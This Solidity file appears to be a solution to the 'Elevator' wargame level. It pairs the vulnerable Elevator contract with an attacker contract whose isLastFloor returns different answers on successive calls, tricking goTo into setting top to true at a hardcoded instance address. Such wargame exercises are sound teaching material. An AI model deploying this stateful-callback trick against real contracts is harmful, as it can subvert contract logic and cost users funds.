// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}

contract funnyElevator is Building {
    bool currentValue;

    function solve() external {
        Elevator elev = Elevator(0x2540dDCbF2199DE9E950871A903548dAcE66dB41);
        elev.goTo(5);
    }

    function isLastFloor(uint aux) override external returns (bool) {
        if(currentValue){
            currentValue = !currentValue;
            return true;
        }
        currentValue = !currentValue;
        return false;
    }
}